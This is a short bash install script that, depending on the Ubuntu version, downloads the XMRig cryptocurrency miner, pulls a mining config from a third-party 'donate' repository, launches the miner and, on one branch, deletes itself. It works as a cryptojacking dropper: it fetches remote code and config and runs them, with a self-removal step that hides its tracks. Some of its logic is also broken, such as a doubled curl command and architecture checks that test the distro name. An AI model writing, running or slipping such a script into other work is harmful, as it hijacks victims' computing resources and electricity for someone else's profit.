#!/bin/bash
RUN=$(lsb_release -d | awk -F"\t" '{print $2}' | awk -F'.' '{print $1 "'.'" $2}')
if [ "$RUN" = 'Ubuntu 20.04' ]
then
	echo ubuntu 20.04
	curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz
	tar -xf xmrig-6.16.2-focal-x64.tar.gz
	rm xmrig-6.16.2-focal-x64.tar.gz ./xmrig-6.16.2/SHA256SUMS
	curl -OL curl -OL https://raw.githubusercontent.com/1nachi/donate/main/config.json
	mv config.json ./xmrig-6.16.2/
	./xmrig-6.16.2/xmrig
	rm startup.sh
elif [ "$RUN" = 'Ubuntu 18.04' ]
then
	echo ubuntu 18.04
	curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
	tar -xf xmrig-6.16.2-bionic-x64.tar.gz
	rm xmrig-6.16.2-bionic-x64.tar.gz ./xmrig-6.16.2/SHA256SUMS
	curl -OL curl -OL https://raw.githubusercontent.com/1nachi/donate/main/config.json
	mv config.json ./xmrig-6.16.2/
	./xmrig-6.16.2/xmrig
elif [ "$RUN" != 'aarch64' ] && [ "$RUN" != 'armhf' ]
then
	echo linux amd64
elif [ "$RUN" = 'armhf' ]
then
	echo "arm32 (armhf) isn't supported by xmrig, i'm sorry."
else
	sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
	git clone https://github.com/xmrig/xmrig.git
	mv xmrig xmrigT
	mkdir xmrigT/build
	cd xmrigT/build
	cmake ..
	make
	mv xmrig ../../xmrig
	cd ../../xmrig
	curl -OL https://raw.githubusercontent.com/1nachi/donate/main/config.json
	rm -r ../xmrigT

fi
